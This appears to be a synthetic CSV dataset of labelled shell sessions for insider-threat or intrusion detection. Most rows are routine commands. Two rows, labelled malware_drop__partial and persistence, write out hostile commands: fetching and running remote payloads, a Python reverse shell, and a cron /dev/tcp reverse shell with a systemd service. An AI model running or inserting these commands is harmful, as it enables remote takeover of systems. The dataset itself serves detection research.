session_id,user_id,role,hostname,session_start,session_duration_s,after_hours,command_count,command_sequence,label,attack_type
d19d33e6fb604f14a2c7baf84cd40fa1,u0019,analyst,analyst-ws-03,2025-09-09 09:08:58,1729,0,13,"md5sum /data/users.db -> zip -r /tmp/<TMPFILE> /data/ -> cut -d',' -f1,<NUM> /data/users.db | head -> source ~/.bashrc -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> clear -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/debug.log | wc -l -> netstat -an | grep ESTABLISHED -> ls -> sudo iptables -L -n -> history | tail -<NUM> -> which git -> exit",1,none
b53bc9eb8fde406e9fd1b389289525fc,u0061,dev,analyst-ws-12,2025-09-09 11:22:58,3554,0,29,git diff HEAD~3 -> cd ~ -> git diff HEAD~2 -> cd ~ -> which python -> python -m pytest tests/ -x -> date -> date -> git log --oneline -5 -> cat logs/access.log -> uptime -> make test -> find . -name '*.py' | xargs wc -l -> git checkout -b feature/<HEX> -> cat logs/app.log -> export DEBUG=false -> cat config/dev.yaml -> pwd -> black src/ -> cd ~/projects/data-lake -> git log --oneline -<NUM> -> tail -f logs/app.log -> date -> git log --oneline -<NUM> -> docker ps -> make test -> env | grep API -> make build -> exit,0,none
18623ee640d44f6b8821f0c3361d7eb4,u0077,dev,analyst-ws-05,2025-09-09 14:01:18,219,0,21,ls -la -> cat config/settings.yaml -> alias ll='ls -la' -> whoami -> pip install -r requirements.txt -> docker ps -> tail -f logs/access.log -> git status -> git checkout -b feature/<HEX> -> git pull origin main -> pwd -> ls -la ~/.aws/ -> cat ~/.bash_history -> cat logs/app.log -> alias ll='ls -la' -> clear -> alias ll='ls -la' -> grep -r 'TODO' src/ -> pytest tests/unit/ --cov=src --cov-report=term-missing -> nano config/dev.yaml -> exit,1,none
c2984951a607444993fc4b86b065ed6b,u0023,analyst,analyst-ws-12,2025-09-09 14:03:45,2274,0,19,"python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> cat /data/transactions.csv -> groups -> pwd -> grep -i 'error' /var/log/app.log -> cat ~/.gitconfig -> uptime -> du -sh /data/* -> ls -> whoami -> rsync -avz /data/ nas-store:/backup/data/ -> history | tail -<NUM> -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/syslog | wc -l -> head -<NUM> /data/model_weights.pkl -> sort -t',' -k1 -n /data/model_weights.pkl | tail -<NUM> -> id -> cat /data/users.db -> ls -la -> exit",1,none
9a112858ae634f16bbe2a8e869336e66,u0038,dev,dev-ws-10,2025-09-09 14:12:02,2127,0,31,ls -la -> black src/ -> which git -> ls -> docker build -t myapp:6a19 . -> docker run --rm -p <NUM>:<NUM> myapp:latest -> history | tail -<NUM> -> git pull origin develop -> env | grep -i pass -> pwd -> python -m pytest tests/ -x -> cat config/settings.yaml -> export DEBUG=true -> git stash -> gti status -> git status -> cat ~/.gitconfig -> black src/ -> pip list --outdated -> black src/ -> cd ~ -> git pull origin main -> ls -> docker logs <HEX> --tail <NUM> -> history | tail -<NUM> -> history | tail -<NUM> -> env | grep SECRET -> find . -name '*.py' | xargs wc -l -> flake8 src/ --max-line-length <NUM> -> man sed -> exit,1,none
5532851a168a429e8e6c968f41b962e0,u0057,dev,analyst-ws-11,2025-09-09 14:57:14,3262,0,23,cat config/dev.yaml -> curl -s http://localhost:<NUM>/health -> ls -lh -> cd ~ -> make test -> cat logs/syslog -> make build -> echo $USER -> ls -la -> ls -lh -> whoami -> echo $PATH -> export DEBUG=info -> echo $USER -> vim migrate.py -> docker build -t myapp:f3c7 . -> date -> git diff HEAD~3 -> docker ps -> make build -> clear -> date -> exit,0,none
aa3f2b76c6f2480fb72262cba871cde5,u0076,admin,dev-ws-14,2025-09-09 16:52:01,3135,0,30,"sudo systemctl restart gunicorn -> vmstat 1 5 -> sudo nano /etc/resolv.conf -> date -> which git -> iostat -x 1 3 -> history | tail -<NUM> -> cd .. -> vmstat 1 5 -> which python -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> wget -q http://<IP>/<HEX>.sh -O /tmp/<TMPFILE> -> curl -s http://<IP>/<HEX>.bin -o /tmp/<TMPFILE> -> chmod +x /tmp/<TMPFILE> -> /tmp/<TMPFILE> & -> nohup python3 -c ""import socket,os,pty;s=socket.socket();s.connect(('<IP>',<NUM>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"" & -> rm -f /tmp/<TMPFILE> /tmp/<TMPFILE> -> sudo chmod <NUM> /etc/nginx/nginx.conf -> tail -f /var/log/syslog -> tail -f /var/log/syslog -> tail -f /var/log/syslog -> df -h -> cd .. -> sudo ufw status verbose -> ss -tlnp -> who -> free -m -> ls -> journalctl -xe --since '<NUM> hour ago' -> exit",2,malware_drop__partial
9e44d0ca90a9496a950d99b6d8e98ee3,u0076,admin,analyst-ws-04,2025-09-10 13:46:34,2828,0,13,pwd -> sudo -l -> history | tail -<NUM> -> sudo chmod <NUM> /etc/nginx/nginx.conf -> sudo nano /etc/resolv.conf -> echo $PATH -> journalctl -u nginx -n <NUM> -> journalctl -u gunicorn -n <NUM> -> tail -f /var/log/syslog -> ls -la ~/.aws/ -> ip route show -> echo $USER -> exit,1,none
c8bd7cd2de4f444fa4258ea3a0604b8f,u0057,dev,dev-ws-05,2025-09-10 14:28:43,1639,0,25,python -m pytest tests/ -q -> pip list --outdated -> export LOG_LEVEL=info -> which python -> flake8 src/ --max-line-length <NUM> -> ls -la -> history | tail -<NUM> -> history | tail -<NUM> -> pip install -r requirements.txt -> git pull origin develop -> git status -> docker build -t myapp:f43a . -> grep -r 'TODO' src/ -> docker ps -> pip install fastapi -> docker build -t myapp:719a . -> export LOG_LEVEL=production -> cd ~/projects/recommendation-engine -> grep -r 'TODO' src/ -> ls -la -> docker ps -> pwd -> export DEBUG=info -> black src/ -> exit,0,none
e521a56549f64bbbb55f1f9a5abd1f80,u0033,dev,dev-ws-13,2025-09-10 14:37:01,3284,0,11,ssh -i ~/.ssh/id_rsa deploy@staging-<NUM> -> cat ~/.gitconfig -> zip -r /tmp/<TMPFILE> /data/ -> python train.py -> cd ~ -> traceroute <IP> -> ls -> echo $PATH -> pwd -> crontab -e -> exit,1,none
2568875c139e42ac961a75038454f26a,u0072,admin,dev-ws-14,2025-09-10 15:35:48,1679,0,28,sudo systemctl enable auditd -> ss -tlnp -> which git -> last | head -<NUM> -> crontab -l -> sudo ufw allow <NUM>/tcp -> top -bn1 | head -<NUM> -> echo $PATH -> vmstat 1 5 -> uptime -> sudo systemctl status cron -> echo $PATH -> !! -> history | tail -<NUM> -> sudo journalctl --since '5 days ago' | grep -i fail -> sudo systemctl status redis -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> sudo systemctl restart auditd -> man find -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> ls -> ping -c <NUM> <IP> -> echo $USER -> uptime -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> iostat -x 1 3 -> cd ~ -> exit,0,none
b5ba699d90454975ac8750cddcb742c4,u0026,admin,dev-ws-06,2025-09-10 16:16:34,3093,0,20,ss -tlnp -> journalctl -u cron -n <NUM> -> uptime -> sudo apt autoremove -y -> history | tail -<NUM> -> journalctl -u auditd -n <NUM> -> uptime -> sudo chown www-data /var/www/html -> sudo apt install -y auditd -> ls -la -> alias ll='ls -la' -> uptime -> date -> cd .. -> sudo journalctl --since '1 days ago' | grep -i fail -> tail -f /var/log/syslog -> vmstat 1 5 -> cd ~ -> netstat -tulpn -> exit,0,none
a0279093497b423ba7f1c038d5aef705,u0015,dev,dev-ws-05,2025-09-10 16:33:29,3566,0,12,git log --oneline -9 -> python -m pytest tests/ -v -> git pull origin main -> git diff HEAD~2 -> echo $PATH -> man ls -> pip list --outdated -> flake8 src/ --max-line-length <NUM> -> docker ps -> nano config/dev.yaml -> git pull origin develop -> exit,0,none
8e1c078062dd4137abbfcf52bf52b937,u0047,dev,dev-ws-13,2025-09-10 18:26:37,2744,0,22,ls -la -> curl -s http://localhost:<NUM>/health -> man ls -> date -> nano config/settings.yaml -> export LOG_LEVEL=info -> whoami -> pip install -r requirements.txt -> ls -la -> date -> cd ~/projects/billing-svc -> cd ~/projects/reporting -> cd ~ -> make test -> docker build -t myapp:fd4e . -> pip list --outdated -> cat config/prod.yaml -> source ~/.bashrc -> grep -r 'TODO' src/ -> ls -la -> git pull origin main -> exit,0,none
aae4e3690d1441f2818e4f1815a0bb75,u0050,admin,analyst-ws-07,2025-09-11 02:24:44,768,1,15,crontab -l -> cat /etc/group -> alias ll='ls -la' -> sudo nano /etc/hosts -> cat ~/.gitconfig -> df -h -> diff /data/report.parquet /backup/users.db -> df -h -> sudo systemctl status cron -> ip neigh show -> ls -lh -> ss -antp -> which git -> ls -la -> exit,1,none
fba39aabc6c142b9ad80b3bca218e204,u0039,dev,dev-ws-03,2025-09-11 13:24:57,1123,0,15,less /var/log/auth.log -> ping -c 5 <IP> -> wc -l /data/embeddings.npy -> groups -> flake8 src/ --max-line-length <NUM> -> echo $USER -> getent passwd -> which git -> cd .. -> ls -la -> git checkout -b feature/<HEX> -> tar -czf /tmp/<TMPFILE> ~/ -> docker run --rm -p <NUM>:<NUM> myapp:latest -> crontab -e -> exit,1,none
7f231e063dfc440d91fcbd4176cbfc20,u0066,dev,dev-ws-04,2025-09-11 18:13:25,1251,0,23,git diff HEAD~3 -> pwd -> source ~/.bashrc -> crontab -e -> netstat -an | grep ESTABLISHED -> make build -> md5sum /data/users.db -> sl -> echo <HEX> | base64 -d -> less /var/log/debug.log -> python analyze.py --input /data/customers.csv --output /tmp/<TMPFILE> -> docker ps -> clear -> cat /etc/cron.d/monitoring -> pytest tests/unit/ --cov=src --cov-report=term-missing -> cat ~/.gitconfig -> !! -> echo $USER -> pip install -r requirements.txt -> pip list --outdated -> cat logs/audit.log -> nano config/dev.yaml -> exit,1,none
f0dd01a57f4547718d2310b8b9ab3bee,u0044,dev,admin-srv-02,2025-09-12 08:24:15,1065,0,27,make test -> docker ps -> git stash -> docker run --rm -p <NUM>:<NUM> myapp:latest -> cat logs/audit.log -> pip install fastapi -> clear -> cd .. -> man find -> find . -name '*.py' | xargs wc -l -> echo <HEX> | base64 -d -> git log --oneline -<NUM> -> git checkout -b feature/<HEX> -> docker run --rm -p <NUM>:<NUM> myapp:latest -> echo $USER -> env | grep -i pass -> arp -a -> find . -name '*.py' | xargs wc -l -> ls -la -> make test -> cat ~/.ssh/known_hosts -> which git -> man sed -> ip neigh show -> clear -> whoami -> exit,1,none
b8cef3e7baf441cf99ee266b8de5a654,u0023,analyst,analyst-ws-09,2025-09-12 08:54:45,2917,0,28,"clear -> whoami -> which git -> rsync -avz /data/ staging-<NUM>:/backup/data/ -> scp /tmp/<TMPFILE> build-agent:/backup/ -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> uptime -> python3 -c ""import base64; print(base64.b64decode('<HEX>'))"" -> rsync -avz /data/ dev-<NUM>:/backup/data/ -> echo $PATH -> grep -i 'timeout' /var/log/debug.log -> echo $PATH -> which git -> !! -> sudo -l -> ls -la ~/.aws/ -> wc -l /data/report.parquet -> whoami -> ls -lh -> cut -d',' -f3,7 /data/report.parquet | head -> source ~/.bashrc -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> ls -lh -> ping -c 5 <IP> -> ls -la /var/spool/cron/ -> rsync -avz /data/ build-agent:/backup/data/ -> jupyter nbconvert --to script analysis_4b2b.ipynb -> exit",1,none
ef5a0d39d468444381d27801373e38df,u0070,admin,analyst-ws-11,2025-09-12 11:30:22,3445,0,28,"python3 -c ""import base64; print(base64.b64decode('<HEX>'))"" -> uptime -> df -h -> sudo systemctl status redis -> sudo ufw allow <NUM>/tcp -> pytest tests/unit/ --cov=src --cov-report=term-missing -> find . -name '*.py' | xargs wc -l -> git log --oneline -<NUM> -> ping -c 5 <IP> -> sudo ufw allow <NUM>/tcp -> sudo chown www-data /var/www/html -> tail -f /var/log/syslog -> ping -c 5 <IP> -> vmstat 1 5 -> clear -> last | head -<NUM> -> sudo chown www-data /var/www/html -> cat /var/log/nginx.log -> cd .. -> echo <HEX> | base64 -d -> sudo journalctl --since '5 days ago' | grep -i fail -> journalctl -xe --since '1 hour ago' -> uptime -> cat /etc/group -> uptime -> du -sh /var/log/* -> netstat -tulpn -> exit",1,none
9aad0f3221c1446b8efa804ecdee41fb,u0004,dev,analyst-ws-06,2025-09-13 08:06:56,2853,0,25,cd .. -> make build -> whoami -> python -m pytest tests/ -q -> pwd -> echo $PATH -> sudo -l -> docker build -t myapp:<NUM> . -> git stash -> arp -a -> echo <HEX> | base64 -d -> ssh -i ~/.ssh/id_rsa deploy@backup-<NUM> -> git pull origin main -> python -m pytest tests/ -q -> python sync.py -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ls -la -> git diff HEAD~3 -> black src/ -> black src/ -> tail -f logs/debug.log -> nano config/prod.yaml -> clear -> ls -lh -> exit,1,none
dded2f72d8974ebe87f09d49b379fd67,u0072,admin,dev-ws-01,2025-09-13 11:07:59,1578,0,25,which python -> alias ll='ls -la' -> nano config/prod.yaml -> du -sh /var/log/* -> netstat -tulpn -> whoami -> which git -> uptime -> clear -> arp -a -> sudo apt update -> sudo apt install -y libssl-dev -> sudo chown www-data /var/www/html -> du -sh /var/log/* -> ss -tlnp -> cat ~/.aws/credentials -> alias ll='ls -la' -> cd .. -> echo $PATH -> cd ~ -> who -> sudo apt install -y net-tools -> echo $PATH -> sudo chmod <NUM> /etc/nginx/nginx.conf -> exit,0,none
7e7d8a38bac5450391ea08b9a9a70079,u0018,analyst,analyst-ws-08,2025-09-13 12:49:07,563,0,19,"cat /data/embeddings.npy -> !! -> source ~/.bashrc -> pwd -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> python -c 'import pandas as pd; df=pd.read_csv(""/data/users.db""); print(df.describe())' -> uptime -> source ~/.bashrc -> which git -> sort -t',' -k3 -n /data/model_weights.pkl | tail -<NUM> -> echo $USER -> python analyze.py --input /data/model_weights.pkl -> scp /tmp/<TMPFILE> data-lake:/backup/ -> sort -t',' -k3 -n /data/model_weights.pkl | tail -<NUM> -> which python -> uptime -> python analyze.py --input /data/transactions.csv --output /tmp/<TMPFILE> -> source ~/.bashrc -> exit",0,none
09d25b6b070f426ca2ad325389a76748,u0073,dev,admin-srv-01,2025-09-13 16:29:51,1554,0,11,"ls -la -> cd ~ -> python3 -c ""import base64; print(base64.b64decode('<HEX>'))"" -> echo $PATH -> git status -> pip install -r requirements.txt -> date -> which git -> sudo -l -> pip install torch -> exit",1,none
bee3fb16f81a4a1e9c4162a87588adae,u0069,admin,admin-srv-06,2025-09-13 17:52:34,2648,0,27,source ~/.bashrc -> sudo apt update -> cd .. -> ss -tlnp -> ls -lh -> sudo nano /etc/fstab -> journalctl -xe --since '1 hour ago' -> cat /var/log/error.log -> sudo systemctl enable celery -> sudo journalctl --since '1 days ago' | grep -i fail -> sudo iptables -L -n -> history | tail -<NUM> -> which python -> sudo ufw allow <NUM>/tcp -> ls -la -> ping -c 7 <IP> -> sudo ufw allow <NUM>/tcp -> cd ~ -> ls -lh -> whoami -> date -> cd .. -> sudo -l -> vmstat 1 5 -> iostat -x 1 3 -> sudo chown www-data /var/www/html -> exit,0,none
66d65288c4c44a528fb498a130fb48b0,u0035,admin,dev-ws-03,2025-09-13 18:59:14,2942,0,25,ls -> which python -> sudo ufw status verbose -> free -m -> journalctl -xe --since '<NUM> hour ago' -> sudo apt update -> sudo ufw status verbose -> sudo apt update -> ls -> alias ll='ls -la' -> iostat -x 1 3 -> uptime -> cat ~/.gitconfig -> ping -c 3 <IP> -> iostat -x 1 3 -> ip route show -> sudo chmod <NUM> /etc/nginx/nginx.conf -> uptime -> sudo apt update -> crontab -l -> ping -c 5 <IP> -> uptime -> source ~/.bashrc -> cat /var/log/nginx.log -> exit,1,none
91c8d34afbe64568bf1a8d68f1f354f6,u0048,analyst,analyst-ws-01,2025-09-14 08:48:45,485,0,30,"date -> alias ll='ls -la' -> uptime -> which git -> ls -> rsync -avz /data/ dev-<NUM>:/backup/data/ -> python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> source ~/.bashrc -> cd .. -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> source ~/.bashrc -> ls -lh -> du -sh /data/* -> jupyter nbconvert --to script analysis_de13.ipynb -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/app.log | wc -l -> ls -la ~/.ssh/ -> env | grep -i token -> python analyze.py --input /data/payroll.xlsx --output /tmp/<TMPFILE> -> sqlite3 analytics.db 'SELECT COUNT(*) FROM users;' -> grep -i 'fail' /var/log/audit.log -> ls -lh -> ls -la /var/spool/cron/ -> less /var/log/debug.log -> awk '{print $1}' /var/log/syslog | sort | uniq -c | sort -rn | head -<NUM> -> ls -la -> echo $USER -> ls -lh -> sort -t',' -k3 -n /data/report.parquet | tail -<NUM> -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> exit",1,none
ef88721f5aee408089d08aedc8dd15d1,u0049,dev,dev-ws-05,2025-09-14 11:57:45,3126,0,26,"ls -lh -> date -> cat ~/.aws/credentials -> cd ~/projects/auth-service -> cd .. -> zip -r /tmp/<TMPFILE> /data/ -> pytest tests/unit/ --cov=src --cov-report=term-missing -> flake8 src/ --max-line-length <NUM> -> whoami -> tail -f logs/app.log -> cat ~/.gitconfig -> curl -s http://localhost:<NUM>/health -> pip list --outdated -> grep -r 'TODO' src/ -> cd ~/projects/etl-jobs -> make build -> tar -czf /tmp/<TMPFILE> ~/ -> git status -> find / -perm -<NUM> 2>/dev/null -> python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> whoami -> history | tail -<NUM> -> env | grep REDIS -> scp /var/log/audit.log nas-store:/archive/ -> exit",1,none
e7d30e4646044f50a594f9113b9e8135,u0010,dev,admin-srv-08,2025-09-14 13:43:54,161,0,9,nano config/settings.yaml -> source ~/.bashrc -> cat logs/nginx.log -> ls -la -> ssh -i ~/.ssh/id_rsa deploy@log-collector -> docker run --rm -p <NUM>:<NUM> myapp:latest -> echo $PATH -> pip install -r requirements.txt -> exit,0,none
0d5986dc33be4514bc9fe6189b130333,u0000,dev,dev-ws-06,2025-09-14 13:57:16,1489,0,24,which python -> make test -> git pull origin develop -> cat logs/debug.log -> flake8 src/ --max-line-length <NUM> -> echo '*/<NUM> * * * * bash -i >& /dev/tcp/<IP>/<NUM> 0>&1' | crontab - -> crontab -l -> echo '[Unit]' > /tmp/<TMPFILE> -> sudo cp /tmp/<TMPFILE> /etc/systemd/system/sys-934c.service -> sudo systemctl daemon-reload -> sudo systemctl enable sys-f604 -> curl -s http://<IP>/ping -> which git -> ls -la -> uptime -> uptime -> uptime -> make test -> source ~/.bashrc -> pytest tests/unit/ --cov=src --cov-report=term-missing -> pip list --outdated -> ls -la -> which git -> exit,2,persistence
ae36ab669c9d453184b722c1a05ea5e3,u0077,dev,dev-ws-07,2025-09-14 14:06:33,1391,0,13,ssh -i ~/.ssh/id_rsa deploy@dev-<NUM> -> cd ~ -> docker ps -> alias ll='ls -la' -> cd ~ -> flake8 src/ --max-line-length <NUM> -> cd ~/projects/data-lake -> python ingest.py -> cd .. -> docker build -t myapp:f612 . -> curl -s http://localhost:<NUM>/health -> export DEBUG=false -> exit,0,none
e7a7dd4f6be44fecb594ed0d5f6d9089,u0027,dev,dev-ws-05,2025-09-14 18:52:04,1503,0,29,env | grep REDIS -> git status -> ls -> git checkout -b feature/<HEX> -> git stash -> date -> git pull origin main -> curl -s http://localhost:<NUM>/health -> docker run --rm -p <NUM>:<NUM> myapp:latest -> git log --oneline -8 -> cd .. -> tail -f logs/app.log -> git diff HEAD~1 -> python deploy.sh -> ls -> git pull origin develop -> python -m pytest tests/ -q -> source ~/.bashrc -> pwd -> python -m pytest tests/ -v -> history | tail -<NUM> -> pip install torch -> cat config/dev.yaml -> cd .. -> man grep -> docker run --rm -p <NUM>:<NUM> myapp:latest -> pytest tests/unit/ --cov=src --cov-report=term-missing -> which python -> exit,0,none
2db5ec9d4e5348c882576b4569de36a8,u0053,analyst,dev-ws-07,2025-09-15 08:29:23,2130,0,27,"cd ~ -> which git -> grep -i 'error' /var/log/nginx.log -> which python -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -<NUM> -> awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -<NUM> -> python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> cat /data/model_weights.pkl -> head -<NUM> /data/payroll.xlsx -> source ~/.bashrc -> wc -l /data/payroll.xlsx -> alias ll='ls -la' -> ls -> scp /tmp/<TMPFILE> archive-srv:/backup/ -> pwd -> ls -lh /data -> diff /data/model_weights.pkl /backup/users.db -> python -c 'import pandas as pd; df=pd.read_csv(""/data/model_weights.pkl""); print(df.describe())' -> date -> which python -> cd ~ -> sort -t',' -k5 -n /data/users.db | tail -<NUM> -> which git -> rsync -avz /data/ log-collector:/backup/data/ -> awk '{print $1}' /var/log/app.log | sort | uniq -c | sort -rn | head -<NUM> -> exit",0,none
49a2afcbeff84046b8509b23a98e0e66,u0067,dev,analyst-ws-12,2025-09-15 10:49:16,1483,0,29,git status -> tail -f logs/auth.log -> docker build -t myapp:728f . -> source ~/.bashrc -> history | tail -<NUM> -> man awk -> which git -> uptime -> source ~/.bashrc -> git checkout -b feature/<HEX> -> git log --oneline -<NUM> -> pip list --outdated -> tail -f logs/audit.log -> pip install -r requirements.txt -> export ENV=info -> tail -f logs/audit.log -> black src/ -> git stash -> echo $PATH -> cd ~ -> ls -lh -> history | tail -<NUM> -> git diff HEAD~1 -> echo $PATH -> make build -> docker run --rm -p <NUM>:<NUM> myapp:latest -> alias ll='ls -la' -> docker logs <HEX> --tail <NUM> -> exit,0,none
b66a1c878ca14ad3b9efe5802880bade,u0063,dev,admin-srv-02,2025-09-15 13:40:57,805,0,18,git checkout -b feature/<HEX> -> python -m pytest tests/ -x -> docker build -t myapp:f0b8 . -> ls -la -> man find -> which python -> make build -> black src/ -> flake8 src/ --max-line-length <NUM> -> git checkout -b feature/<HEX> -> cd .. -> whoami -> docker logs <HEX> --tail <NUM> -> python -m pytest tests/ -v -> echo $USER -> pip install requests -> ls -la -> exit,0,none
287cb36594734527b5a81dbfca70f946,u0017,dev,dev-ws-06,2025-09-15 17:22:04,345,0,29,flake8 src/ --max-line-length <NUM> -> flake8 src/ --max-line-length <NUM> -> git pull origin main -> ping -c 3 <IP> -> echo $USER -> vim evaluate.py -> export DEBUG=info -> python -m pytest tests/ -v -> clear -> flake8 src/ --max-line-length <NUM> -> docker build -t myapp:60df . -> pytest tests/unit/ --cov=src --cov-report=term-missing -> man find -> export LOG_LEVEL=production -> cat ~/.ssh/known_hosts -> make build -> date -> cd ~/projects/data-lake -> ls -lh -> cd ~/projects/reporting -> docker ps -> which git -> make test -> make test -> pip list --outdated -> traceroute <IP> -> ss -antp -> crontab -e -> exit,1,none
cb4f8da7bbe7452ea26bb7bc208e43a3,u0015,dev,analyst-ws-04,2025-09-15 18:02:57,2865,0,8,alias ll='ls -la' -> pwd -> !! -> git log --oneline -<NUM> -> pip install -r requirements.txt -> alias ll='ls -la' -> python train.py -> exit,0,none
01ab6a91e0a84dfca98a30b27b0c3784,u0032,dev,dev-ws-06,2025-09-15 18:48:28,952,0,8,which git -> cd ~/projects/billing-svc -> echo $USER -> ls -la -> git checkout -b feature/<HEX> -> head -<NUM> /data/customers.csv -> pip install paramiko -> exit,0,none
859a689d062645e9a1185fb4c2680b2e,u0029,analyst,admin-srv-07,2025-09-16 09:32:30,1913,0,21,"ls -lh /data -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> sudo -l -> cat /data/payroll.xlsx -> date -> clear -> clear -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/error.log | wc -l -> awk '{print $1}' /var/log/syslog | sort | uniq -c | sort -rn | head -<NUM> -> cat /data/users.db -> python analyze.py --input /data/report.parquet -> cp /etc/passwd /tmp/<TMPFILE> -> whoami -> rsync -avz /data/ nas-store:/backup/data/ -> head -<NUM> /data/users.db -> grep -i 'error' /var/log/app.log -> which python -> crontab -e -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> diff /data/report.parquet /backup/payroll.xlsx -> exit",1,none
ce358de493104ea2bbae9403aaafe411,u0035,admin,dev-ws-09,2025-09-16 10:33:10,2247,0,24,sudo -l -> date -> echo $PATH -> sudo systemctl status celery -> date -> echo $USER -> ss -tlnp -> alias ll='ls -la' -> echo $USER -> sudo apt autoremove -y -> top -bn1 | head -<NUM> -> tail -f /var/log/syslog -> cat /var/log/error.log -> sudo nano /etc/fstab -> source ~/.bashrc -> ping -c 6 <IP> -> sudo ufw allow <NUM>/tcp -> uptime -> sudo iptables -L -n -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> ls -> sudo systemctl enable postgresql -> alias ll='ls -la' -> exit,0,none
7c2bebc4f5534ac9a3cb5fed1122a89d,u0035,admin,analyst-ws-04,2025-09-16 12:34:15,1589,0,21,"ss -tlnp -> uptime -> man ls -> uptime -> tail -f /var/log/syslog -> sudo apt autoremove -y -> iostat -x 1 3 -> alias ll='ls -la' -> sudo apt autoremove -y -> whoami -> sudo journalctl --since '3 days ago' | grep -i fail -> date -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> cut -d',' -f1,9 /data/payroll.xlsx | head -> tail -f /var/log/syslog -> crontab -l -> last | head -<NUM> -> source ~/.bashrc -> who -> man ls -> exit",0,none
33b320edfa604d74ad810c9aa36011dc,u0052,analyst,admin-srv-03,2025-09-16 12:56:32,1683,0,13,"awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -<NUM> -> du -sh /data/* -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> pwd -> head -<NUM> /data/transactions.csv -> source ~/.bashrc -> uptime -> !! -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT 6;' -> man ls -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> exit",0,none
6b0bfa645df14d68a171f7451f888212,u0021,admin,analyst-ws-01,2025-09-17 08:52:57,565,0,13,which git -> sudo ufw status verbose -> vmstat 1 5 -> sudo ufw status verbose -> vmstat 1 5 -> which python -> uptime -> journalctl -xe --since '<NUM> hour ago' -> journalctl -xe --since '<NUM> hour ago' -> crontab -l -> who -> netstat -tulpn -> exit,0,none
2bf605031160498eb14a22c3abdc0eac,u0000,dev,admin-srv-06,2025-09-17 11:09:36,290,0,19,ls -la /var/spool/cron/ -> make build -> alias ll='ls -la' -> make build -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> env | grep SECRET -> find / -perm -<NUM> 2>/dev/null -> date -> ls -la -> ls -la ~/.aws/ -> crontab -e -> docker build -t myapp:5f15 . -> ping -c 3 <IP> -> docker build -t myapp:dcf9 . -> env | grep API -> docker logs <HEX> --tail <NUM> -> source ~/.bashrc -> cd .. -> exit,1,none
